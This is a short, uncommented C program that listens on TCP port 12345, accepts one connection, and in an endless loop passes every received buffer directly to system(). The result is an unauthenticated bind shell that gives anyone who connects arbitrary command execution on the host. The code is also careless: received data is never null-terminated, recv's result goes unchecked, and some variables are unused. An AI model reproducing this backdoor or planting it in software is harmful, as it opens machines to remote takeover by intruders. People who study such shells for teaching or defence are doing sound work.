#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<unistd.h>
#include<arpa/inet.h>
#include<stdlib.h>
void func(int connfd1){
    char buff[80];int cont;
    for(;;){
        recv(connfd1,&buff,sizeof(buff),0);
        system(buff);
    }
}

int main(){
    int sockfd,connfd1,connfd2;
    struct sockaddr_in servaddr,cliaddr;
    sockfd=socket(AF_INET,SOCK_STREAM,0);
    servaddr.sin_family=AF_INET;
    servaddr.sin_port=htons(12345);
    servaddr.sin_addr.s_addr=INADDR_ANY;
    bind(sockfd,(struct sockaddr *)&servaddr,sizeof(servaddr));
    listen(sockfd,3);
    int n=sizeof(cliaddr);
    connfd1=accept(sockfd,(struct sockaddr *)&cliaddr,&n);
    int pid;
    if((pid=fork())==0){
        close(sockfd);
        func(connfd1);
    }        
}
